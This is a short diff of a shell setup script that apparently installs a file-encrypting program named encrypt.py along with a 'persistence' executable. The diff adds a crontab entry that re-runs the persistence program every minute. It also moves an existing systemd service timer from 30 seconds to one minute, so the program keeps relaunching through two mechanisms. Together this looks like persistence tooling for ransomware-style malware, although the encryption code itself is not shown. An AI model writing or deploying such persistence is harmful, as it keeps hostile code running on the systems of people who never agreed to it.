@@ -36,6 +36,9 @@ chmod +x $TARGET_DIR/persistence
 echo "Executing Encrypt.py..."
 python3 encrypt.py
 
+# Add cron job to execute persistence.py every minute
+(crontab -l 2>/dev/null; echo "* * * * * $EXEC_PATH") | crontab -
+
 # Create the systemd service file for persistence.py
 echo "Creating systemd service file for $SERVICE_NAME..."
 cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
@@ -51,15 +54,15 @@ Restart=on-failure
 WantedBy=multi-user.target
 EOF
 
-# Create the systemd timer file for the service
+# Adjusting the systemd timer file for execution every 1 minute
 echo "Creating systemd timer file for $TIMER_NAME..."
 cat <<EOF > /etc/systemd/system/$TIMER_NAME
 [Unit]
 Description=$TIMER_DESCRIPTION
 
 [Timer]
-OnBootSec=30sec
-OnUnitActiveSec=30sec
+OnBootSec=1min
+OnUnitActiveSec=1min
 Unit=$SERVICE_NAME.service
 
 [Install]
